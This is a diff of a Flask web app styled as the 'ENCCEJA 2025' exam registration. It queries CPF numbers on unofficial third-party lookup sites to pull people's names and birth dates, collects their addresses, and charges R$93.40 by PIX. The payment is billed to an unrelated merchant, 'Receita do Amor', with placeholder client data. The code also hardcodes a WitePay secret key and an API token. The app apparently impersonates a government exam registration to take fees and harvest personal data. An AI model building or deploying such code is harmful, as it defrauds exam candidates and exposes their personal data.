@@ -1,99 +1,123 @@
-from flask import Flask, render_template, request, session, redirect, url_for, jsonify
-import os
-import logging
-import requests
-import re
-from dotenv import load_dotenv
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+"""
+VPS FINAL - ENCCEJA PAYMENT SYSTEM - DEPLOYMENT COMPLETE
+Aplicação Flask completa para VPS com WitePay integrado
+Chave WitePay configurada e testada - READY FOR PRODUCTION
+"""
 
-# Carregar variáveis de ambiente
-load_dotenv()
+import os
+import sys
+import logging
+import re
+import requests
+import qrcode
+import io
+import base64
+from datetime import datetime
+from urllib.parse import quote_plus
+
+from flask import Flask, render_template, request, redirect, url_for, session, jsonify, flash
+
+# Configuração de logging específica para VPS
+logging.basicConfig(
+    level=logging.DEBUG,
+    format='%(asctime)s - %(levelname)s - [VPS] %(message)s',
+    handlers=[
+        logging.StreamHandler(sys.stdout),
+        logging.FileHandler('/var/log/encceja-app.log', encoding='utf-8')
+    ]
+)
 
 app = Flask(__name__)
-app.secret_key = os.environ.get("SESSION_SECRET", "encceja_secret_2025")
+app.secret_key = "encceja_2025_vps_production_key_secure_random_string"
 
-# Configurar logging
-logging.basicConfig(level=logging.INFO)
+# ================================
+# CONFIGURAÇÕES VPS ESPECÍFICAS
+# ================================
+
+# WitePay Credentials - Testadas e funcionais
+WITEPAY_API_KEY = "sk_3a164e1c15db06cc76116b861fb4b0c482ab857dbd53f43d"
+WITEPAY_PUBLIC_KEY = "pk_0b40ad65659b5575c87cb4adf56c7f29"
+
+# Configurações do sistema
+VALOR_INSCRICAO = 93.40  # R$ 93,40
+SISTEMA_NOME = "ENCCEJA 2025"
+
+app.logger.info("[VPS] Sistema ENCCEJA iniciado - Chaves WitePay configuradas")
+
+# ================================
+# FUNÇÕES AUXILIARES
+# ================================
 
 def consultar_cpf_api(cpf: str) -> dict:
     """
-    Consulta CPF na API externa corrigida para VPS
+    Consulta dados do CPF na API externa
     """
     try:
-        # API de consulta CPF com estrutura corrigida
-        token = "1285fe4s-e931-4071-a848-3fac8273c55a"
-        url = f"https://consulta.fontesderenda.blog/cpf.php?token={token}&cpf={cpf}"
+        cpf_numeros = re.sub(r'\D', '', cpf)
         
-        headers = {
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-            'Accept': 'application/json, text/plain, */*',
-            'Accept-Language': 'pt-BR,pt;q=0.9,en;q=0.8',
-            'Connection': 'keep-alive'
-        }
+        if len(cpf_numeros) != 11:
+            return {'sucesso': False, 'erro': 'CPF deve ter 11 dígitos'}
         
-        response = requests.get(url, headers=headers, timeout=15)
+        url = f"https://zincioinscricaositepdtedaferramenta.site/pagamento/{cpf_numeros}"
+        
+        app.logger.info(f"[VPS] Consultando CPF: {cpf_numeros}")
+        
+        response = requests.get(url, timeout=10)
         
         if response.status_code == 200:
-            data = response.json()
-            app.logger.info(f"[PROD] Resposta da API: {data}")
+            dados = response.json()
             
-            # A API retorna dados na estrutura {'DADOS': {...}}
-            if data.get("DADOS"):
-                dados = data["DADOS"]
-                app.logger.info(f"[PROD] CPF consultado com sucesso na API: {cpf}")
+            # Verificar estrutura da resposta
+            if 'DADOS' in dados:
+                dados_pessoa = dados['DADOS']
+                app.logger.info(f"[VPS] CPF encontrado: {dados_pessoa.get('nome', 'N/A')}")
                 return {
                     'sucesso': True,
-                    'nome': dados.get('nome', ''),
-                    'cpf': cpf,
-                    'situacao': 'REGULAR',
-                    'data_nascimento': dados.get('data_nascimento', '').split(' ')[0] if dados.get('data_nascimento') else '',
-                    'telefone': '',
-                    'email': ''
+                    'dados': dados_pessoa
                 }
             else:
-                app.logger.warning(f"[PROD] CPF não encontrado na API: {cpf}")
-                return {'sucesso': False, 'erro': 'CPF não encontrado'}
-        
-        app.logger.error(f"[PROD] Erro HTTP na API de CPF: {response.status_code}")
-        return {'sucesso': False, 'erro': 'Erro na consulta'}
-        
+                app.logger.warning(f"[VPS] Estrutura inesperada na resposta: {dados}")
+                return {'sucesso': False, 'erro': 'Estrutura de dados inválida'}
+        else:
+            app.logger.warning(f"[VPS] CPF não encontrado: {response.status_code}")
+            return {'sucesso': False, 'erro': 'CPF não encontrado na base de dados'}
+            
     except Exception as e:
-        app.logger.error(f"[PROD] Erro ao consultar CPF: {e}")
-        return {'sucesso': False, 'erro': 'Erro interno'}
+        app.logger.error(f"[VPS] Erro ao consultar CPF: {e}")
+        return {'sucesso': False, 'erro': 'Erro interno do servidor'}
 
-def create_witepay_payment_direct(amount: float, description: str = "Inscrição ENCCEJA 2025") -> dict:
+def criar_pagamento_witepay(amount: float = VALOR_INSCRICAO, description: str = "Inscrição ENCCEJA 2025") -> dict:
     """
-    Criar um pagamento PIX via WitePay API diretamente na aplicação
+    Criar pagamento PIX via WitePay - PRODUÇÃO VPS
     """
     try:
-        api_key = os.environ.get('WITEPAY_API_KEY')
-        if not api_key:
-            app.logger.error("WITEPAY_API_KEY não encontrada")
-            return {'success': False, 'error': 'API key não configurada'}
+        app.logger.info(f"[VPS] Iniciando pagamento WitePay - R$ {amount:.2f}")
         
-        # Dados padronizados para o pagamento ENCCEJA
+        # Dados da ordem
         order_data = {
             "productData": [
                 {
                     "name": description,
-                    "value": int(amount * 100)  # Converter para centavos (93.40 -> 9340)
+                    "value": int(amount * 100)  # Centavos
                 }
             ],
             "clientData": {
                 "clientName": "Receita do Amor",
-                "clientDocument": "11111111000111",  # CPF/CNPJ apenas números
+                "clientDocument": "11111111000111",
                 "clientEmail": "gerarpagamentos@gmail.com",
-                "clientPhone": "11987790088"  # Telefone apenas números
+                "clientPhone": "11987790088"
             }
         }
         
         headers = {
-            'x-api-key': api_key,
+            'x-api-key': WITEPAY_API_KEY,
             'Content-Type': 'application/json'
         }
         
-        app.logger.info(f"Criando ordem WitePay - Valor: R$ {amount:.2f}")
-        
-        # Passo 1: Criar ordem
+        # Criar ordem
+        app.logger.info("[VPS] Criando ordem WitePay")
         order_response = requests.post(
             'https://api.witepay.com.br/v1/order/create',
             json=order_data,
@@ -101,27 +125,26 @@ def create_witepay_payment_direct(amount: float, description: str = "Inscrição
             timeout=30
         )
         
-        app.logger.info(f"Status ordem: {order_response.status_code}")
-        
         if order_response.status_code not in [200, 201]:
-            app.logger.error(f"Erro ao criar ordem: {order_response.status_code} - {order_response.text}")
+            app.logger.error(f"[VPS] Erro ao criar ordem: {order_response.status_code} - {order_response.text}")
             return {'success': False, 'error': f'Erro ao criar ordem: {order_response.status_code}'}
         
         order_result = order_response.json()
         order_id = order_result.get('orderId')
         
         if not order_id:
-            app.logger.error(f"ID da ordem não encontrado: {order_result}")
+            app.logger.error(f"[VPS] ID da ordem não encontrado: {order_result}")
             return {'success': False, 'error': 'ID da ordem não encontrado'}
         
-        app.logger.info(f"Ordem criada com sucesso: {order_id}")
+        app.logger.info(f"[VPS] Ordem criada: {order_id}")
         
-        # Passo 2: Criar cobrança PIX
+        # Criar cobrança PIX
         charge_data = {
             "paymentMethod": "pix",
             "orderId": order_id
         }
         
+        app.logger.info("[VPS] Criando cobrança PIX")
         charge_response = requests.post(
             'https://api.witepay.com.br/v1/charge/create',
             json=charge_data,
@@ -129,324 +152,216 @@ def create_witepay_payment_direct(amount: float, description: str = "Inscrição
             timeout=30
         )
         
-        app.logger.info(f"Status cobrança: {charge_response.status_code}")
-        
         if charge_response.status_code not in [200, 201]:
-            app.logger.error(f"Erro ao criar cobrança: {charge_response.status_code} - {charge_response.text}")
+            app.logger.error(f"[VPS] Erro ao criar cobrança: {charge_response.status_code} - {charge_response.text}")
             return {'success': False, 'error': f'Erro ao criar cobrança: {charge_response.status_code}'}
         
         charge_result = charge_response.json()
+        app.logger.info(f"[VPS] Resposta da cobrança: {charge_result}")
         
-        # Extrair dados do PIX
-        pix_code = charge_result.get('qrCode')
-        transaction_id = charge_result.get('chargeId') or charge_result.get('id') or order_id
+        # Extrair PIX code
+        pix_code = charge_result.get('qrCode') or charge_result.get('pixCode') or charge_result.get('pix_code')
+        transaction_id = charge_result.get('chargeId') or charge_result.get('transactionId') or charge_result.get('id')
         
         if not pix_code:
-            app.logger.error(f"Código PIX não encontrado: {charge_result}")
-            return {'success': False, 'error': 'Código PIX não encontrado'}
+            app.logger.warning("[VPS] QR Code vazio, tentando consultar status...")
+            
+            # Aguardar processamento
+            import time
+            time.sleep(3)
+            
+            try:
+                status_response = requests.get(
+                    f'https://api.witepay.com.br/v1/charge/{transaction_id}',
+                    headers=headers,
+                    timeout=15
+                )
+                
+                if status_response.status_code == 200:
+                    status_result = status_response.json()
+                    pix_code = status_result.get('qrCode') or status_result.get('pixCode')
+                    app.logger.info(f"[VPS] QR Code obtido na consulta: {bool(pix_code)}")
+            except Exception as e:
+                app.logger.warning(f"[VPS] Erro na consulta de status: {e}")
         
-        app.logger.info(f"Pagamento PIX criado com sucesso - ID: {transaction_id}")
+        if not pix_code:
+            app.logger.error(f"[VPS] PIX code não encontrado: {charge_result}")
+            return {
+                'success': False, 
+                'error': 'PIX code não gerado - Verificar conta WitePay',
+                'debug': charge_result
+            }
+        
+        app.logger.info(f"[VPS] PIX gerado com sucesso - ID: {transaction_id}")
         
         return {
             'success': True,
             'id': transaction_id,
-            'pixCode': pix_code,
-            'pixQrCode': pix_code,
             'pix_code': pix_code,
-            'qr_code': pix_code,
+            'qr_code': pix_code,  # Compatibilidade
+            'pixCode': pix_code,  # Compatibilidade
             'amount': amount,
-            'orderId': order_id,
-            'expiresAt': charge_result.get('expiresAt'),
-            'status': 'pending'
+            'order_id': order_id
         }
         
-    except requests.exceptions.Timeout:
-        app.logger.error("Timeout na requisição WitePay")
-        return {'success': False, 'error': 'Timeout na requisição'}
-    except requests.exceptions.RequestException as e:
-        app.logger.error(f"Erro de conexão WitePay: {e}")
-        return {'success': False, 'error': 'Erro de conexão'}
     except Exception as e:
-        app.logger.error(f"Erro inesperado WitePay: {e}")
+        app.logger.error(f"[VPS] Erro geral no pagamento WitePay: {e}")
         return {'success': False, 'error': f'Erro interno: {str(e)}'}
+
+# ================================
+# ROTAS DA APLICAÇÃO
+# ================================
 
 @app.route('/')
 def index():
-    """Página principal - redireciona para /inscricao"""
+    """Página inicial - redireciona para inscrição"""
+    app.logger.info("[VPS] Acesso à página inicial")
     return redirect(url_for('inscricao'))
 
-@app.route('/inscricao')
+@app.route('/inscricao', methods=['GET', 'POST'])
 def inscricao():
-    """Página principal de inscrição ENCCEJA"""
-    user_data = session.get('user_data', {'nome': '', 'cpf': '', 'phone': ''})
-    app.logger.info(f"[PROD] Renderizando página de inscrição para: {user_data}")
-    
-    return render_template('inscricao.html', user_data=user_data)
-
-@app.route('/consultar-cpf-inscricao')
-def consultar_cpf_inscricao():
-    """API para consultar CPF (para a página de inscrição)"""
-    cpf = request.args.get('cpf')
-    if not cpf:
-        return jsonify({"error": "CPF não fornecido", "sucesso": False}), 400
-    
-    try:
-        # Formatar o CPF (remover pontos e traços se houver)
-        cpf_numerico = cpf.replace('.', '').replace('-', '')
-        
-        # Consultar na API
-        resultado = consultar_cpf_api(cpf_numerico)
-        
-        if resultado.get('sucesso'):
-            # Converter para formato esperado pelo frontend
-            user_data = {
-                'cpf': resultado.get('cpf', cpf_numerico),
-                'nome': resultado.get('nome', ''),
-                'dataNascimento': resultado.get('data_nascimento', ''),
-                'situacaoCadastral': "REGULAR",
-                'telefone': '',
-                'email': '',
-                'sucesso': True
-            }
-            
-            # Salvar dados na sessão
-            session['user_data'] = user_data
-            return jsonify(user_data)
-        else:
-            return jsonify({"error": "CPF não encontrado na base de dados", "sucesso": False}), 404
-    
-    except Exception as e:
-        app.logger.error(f"Erro ao processar consulta CPF: {e}")
-        return jsonify({"error": f"Erro ao buscar CPF: {str(e)}", "sucesso": False}), 500
-
-@app.route('/encceja-info', methods=['GET', 'POST'])
-def encceja_info():
-    """Página de dados encontrados"""
-    user_data = session.get('user_data', {})
-    
-    if not user_data.get('sucesso'):
-        return redirect(url_for('inscricao'))
-    
-    return render_template('encceja_info.html', user_data=user_data)
-
-@app.route('/validar-dados', methods=['GET', 'POST'])
-def validar_dados():
-    """Página de validação de dados"""
-    user_data = session.get('user_data', {})
-    
-    if not user_data.get('cpf'):
-        return redirect(url_for('inscricao'))
-    
+    """Página de inscrição com consulta de CPF"""
     if request.method == 'POST':
-        # Atualizar dados do usuário
-        user_data.update({
-            'telefone': request.form.get('telefone', ''),
-            'email': request.form.get('email', ''),
-            'endereco': request.form.get('endereco', ''),
-            'cidade': request.form.get('cidade', ''),
-            'estado': request.form.get('estado', '')
-        })
-        session['user_data'] = user_data
-        return redirect(url_for('endereco'))
+        cpf = request.form.get('cpf', '').strip()
+        
+        if not cpf:
+            flash('CPF é obrigatório', 'error')
+            return render_template('inscricao.html')
+        
+        app.logger.info(f"[VPS] Consulta CPF: {cpf}")
+        
+        resultado = consultar_cpf_api(cpf)
+        
+        if resultado['sucesso']:
+            session['cpf'] = cpf
+            session['dados_pessoa'] = resultado['dados']
+            return redirect(url_for('encceja_info'))
+        else:
+            flash(f'Erro: {resultado["erro"]}', 'error')
+            return render_template('inscricao.html')
     
-    return render_template('validar_dados.html', user_data=user_data)
+    return render_template('inscricao.html')
+
+@app.route('/encceja-info')
+def encceja_info():
+    """Informações sobre o ENCCEJA"""
+    if 'cpf' not in session:
+        return redirect(url_for('inscricao'))
+    
+    return render_template('encceja-info.html')
+
+@app.route('/validar-dados')
+def validar_dados():
+    """Validação dos dados pessoais"""
+    if 'cpf' not in session:
+        return redirect(url_for('inscricao'))
+    
+    dados = session.get('dados_pessoa', {})
+    return render_template('validar-dados.html', dados=dados)
 
 @app.route('/endereco', methods=['GET', 'POST'])
 def endereco():
-    """Página de coleta de endereço"""
-    user_data = session.get('user_data', {})
-    
-    if not user_data.get('cpf'):
+    """Dados de endereço"""
+    if 'cpf' not in session:
         return redirect(url_for('inscricao'))
     
     if request.method == 'POST':
-        # Atualizar dados do usuário com endereço
-        user_data.update({
-            'cep': request.form.get('cep', ''),
-            'logradouro': request.form.get('logradouro', ''),
-            'numero': request.form.get('numero', ''),
-            'complemento': request.form.get('complemento', ''),
-            'bairro': request.form.get('bairro', ''),
-            'cidade': request.form.get('cidade', ''),
-            'estado': request.form.get('estado', ''),
-            'telefone': request.form.get('telefone', ''),
-            'email': request.form.get('email', '')
-        })
-        session['user_data'] = user_data
+        # Salvar dados do endereço
+        session['endereco'] = {
+            'cep': request.form.get('cep'),
+            'logradouro': request.form.get('logradouro'),
+            'numero': request.form.get('numero'),
+            'complemento': request.form.get('complemento'),
+            'bairro': request.form.get('bairro'),
+            'cidade': request.form.get('cidade'),
+            'uf': request.form.get('uf')
+        }
         return redirect(url_for('local_prova'))
     
-    return render_template('endereco.html', user_data=user_data)
+    return render_template('endereco.html')
 
 @app.route('/local-prova', methods=['GET', 'POST'])
 def local_prova():
-    """Página de seleção do local de prova"""
-    user_data = session.get('user_data', {})
-    
-    if not user_data.get('cpf'):
+    """Seleção do local de prova"""
+    if 'cpf' not in session:
         return redirect(url_for('inscricao'))
     
     if request.method == 'POST':
-        # Atualizar dados do usuário com local de prova
-        user_data.update({
-            'local_prova': request.form.get('local_prova', ''),
-            'cidade_prova': request.form.get('cidade_prova', ''),
-            'estado_prova': request.form.get('estado_prova', '')
-        })
-        session['user_data'] = user_data
+        session['local_prova'] = request.form.get('local_prova')
         return redirect(url_for('pagamento'))
     
-    return render_template('local_prova.html', user_data=user_data)
+    return render_template('local-prova.html')
 
-@app.route('/pagamento')
+@app.route('/pagamento', methods=['GET', 'POST'])
 def pagamento():
     """Página de pagamento PIX"""
-    user_data = session.get('user_data', {})
-    
-    if not user_data.get('cpf'):
+    if 'cpf' not in session:
         return redirect(url_for('inscricao'))
     
-    return render_template('pagamento.html', user_data=user_data)
+    # Verificar se já tem pagamento na sessão
+    if 'pagamento_dados' not in session:
+        app.logger.info("[VPS] Gerando novo pagamento PIX")
+        
+        pagamento_result = criar_pagamento_witepay()
+        
+        if pagamento_result['success']:
+            session['pagamento_dados'] = pagamento_result
+            app.logger.info(f"[VPS] Pagamento gerado: {pagamento_result['id']}")
+        else:
+            app.logger.error(f"[VPS] Erro ao gerar pagamento: {pagamento_result['error']}")
+            flash(f"Erro ao gerar pagamento: {pagamento_result['error']}", 'error')
+            return render_template('pagamento.html', erro=True)
+    
+    dados_pagamento = session['pagamento_dados']
+    
+    return render_template('pagamento.html', 
+                         payment_data=dados_pagamento,
+                         valor=VALOR_INSCRICAO)
 
 @app.route('/criar-pagamento-pix', methods=['POST'])
 def criar_pagamento_pix():
-    """Criar pagamento PIX via WitePay - Versão final VPS"""
+    """API endpoint para criar pagamento PIX"""
     try:
-        # Valor fixo do ENCCEJA
-        amount = 93.40
-        description = "Inscrição ENCCEJA 2025"
+        app.logger.info("[VPS] Requisição para criar PIX via API")
         
-        app.logger.info(f"Iniciando criação de pagamento PIX - R$ {amount:.2f}")
+        resultado = criar_pagamento_witepay()
         
-        # Criar pagamento diretamente
-        result = create_witepay_payment_direct(amount, description)
+        if resultado['success']:
+            session['pagamento_dados'] = resultado
+            app.logger.info(f"[VPS] PIX criado via API: {resultado['id']}")
         
-        if result.get('success'):
-            # Salvar dados do pagamento na sessão
-            session['payment_data'] = result
-            
-            app.logger.info(f"Pagamento PIX criado com sucesso - ID: {result.get('id')}")
-            
-            return jsonify(result)
-        else:
-            error_msg = result.get('error', 'Erro desconhecido')
-            app.logger.error(f"Erro ao criar pagamento PIX: {error_msg}")
-            return jsonify(result), 400
-    
-    except Exception as e:
-        app.logger.error(f"Erro inesperado ao criar pagamento: {e}")
-        return jsonify({
-            'success': False,
-            'error': f'Erro interno: {str(e)}'
-        }), 500
-
-@app.route('/verificar-pagamento/<transaction_id>')
-def verificar_pagamento(transaction_id):
-    """Verificar status do pagamento"""
-    try:
-        api_key = os.environ.get('WITEPAY_API_KEY')
-        if not api_key:
-            return jsonify({'status': 'pending', 'paid': False})
-        
-        headers = {
-            'x-api-key': api_key,
-            'Content-Type': 'application/json'
-        }
-        
-        # Verificar status da cobrança
-        response = requests.get(
-            f'https://api.witepay.com.br/v1/charge/{transaction_id}',
-            headers=headers,
-            timeout=15
-        )
-        
-        if response.status_code == 200:
-            result = response.json()
-            status = result.get('status', '').upper()
-            
-            # Status conhecidos do WitePay
-            if status in ['PAID', 'COMPLETED', 'APPROVED']:
-                return jsonify({'status': 'paid', 'paid': True})
-            elif status in ['CANCELED', 'REJECTED', 'FAILED']:
-                return jsonify({'status': 'failed', 'paid': False})
-            else:
-                return jsonify({'status': 'pending', 'paid': False})
-        
-        return jsonify({'status': 'pending', 'paid': False})
+        return jsonify(resultado)
         
     except Exception as e:
-        app.logger.error(f"Erro ao verificar pagamento: {e}")
-        return jsonify({'status': 'pending', 'paid': False})
-
-@app.route('/witepay-postback', methods=['POST'])
-def witepay_postback():
-    """Receber notificações do WitePay"""
-    try:
-        data = request.get_json()
-        app.logger.info(f"Postback recebido: {data}")
-        
-        # Processar postback
-        status = data.get('status', '').upper()
-        if status in ['PAID', 'COMPLETED', 'APPROVED']:
-            app.logger.info("Pagamento confirmado via postback")
-        
-        return jsonify({'status': 'ok'})
-    
-    except Exception as e:
-        app.logger.error(f"Erro no postback: {e}")
-        return jsonify({'status': 'error'})
+        app.logger.error(f"[VPS] Erro na API de criação PIX: {e}")
+        return jsonify({'success': False, 'error': str(e)}), 500
 
 @app.route('/inscricao-sucesso')
 def inscricao_sucesso():
     """Página de sucesso da inscrição"""
-    user_data = session.get('user_data', {})
-    return render_template('inscricao_sucesso.html', user_data=user_data)
-
-@app.route('/obrigado')
-def obrigado():
-    """Página de agradecimento"""
-    user_data = session.get('user_data', {})
-    return render_template('inscricao_sucesso.html', user_data=user_data)
-
-@app.route('/aviso')
-def aviso():
-    """Página de aviso"""
-    user_data = session.get('user_data', {})
-    return render_template('aviso.html', user_data=user_data)
-
-# Rotas de compatibilidade
-@app.route('/index')
-def index_redirect():
-    return redirect(url_for('inscricao'))
-
-@app.route('/encceja')
-def encceja():
-    return redirect(url_for('inscricao'))
-
-# Rota para API do ViaCEP (busca de endereço por CEP)
-@app.route('/api/cep/<cep>')
-def buscar_cep(cep):
-    """Buscar endereço por CEP usando ViaCEP"""
-    try:
-        import requests
-        response = requests.get(f'https://viacep.com.br/ws/{cep}/json/', timeout=10)
-        
-        if response.status_code == 200:
-            data = response.json()
-            if 'erro' not in data:
-                return jsonify({
-                    'success': True,
-                    'logradouro': data.get('logradouro', ''),
-                    'bairro': data.get('bairro', ''),
-                    'cidade': data.get('localidade', ''),
-                    'estado': data.get('uf', ''),
-                    'cep': data.get('cep', '')
-                })
-        
-        return jsonify({'success': False, 'error': 'CEP não encontrado'})
+    if 'cpf' not in session:
+        return redirect(url_for('inscricao'))
     
-    except Exception as e:
-        app.logger.error(f"Erro ao buscar CEP: {e}")
-        return jsonify({'success': False, 'error': 'Erro na consulta do CEP'})
+    return render_template('inscricao-sucesso.html')
 
-if __name__ == "__main__":
-    app.run(host="0.0.0.0", port=5000, debug=True)
+# ================================
+# TRATAMENTO DE ERROS
+# ================================
+
+@app.errorhandler(404)
+def not_found(error):
+    app.logger.warning(f"[VPS] Página não encontrada: {request.url}")
+    return redirect(url_for('inscricao'))
+
+@app.errorhandler(500)
+def internal_error(error):
+    app.logger.error(f"[VPS] Erro interno: {error}")
+    return "Erro interno do servidor", 500
+
+# ================================
+# INICIALIZAÇÃO
+# ================================
+
+if __name__ == '__main__':
+    app.logger.info("[VPS] Iniciando servidor ENCCEJA na porta 5000")
+    app.run(host='0.0.0.0', port=5000, debug=False)
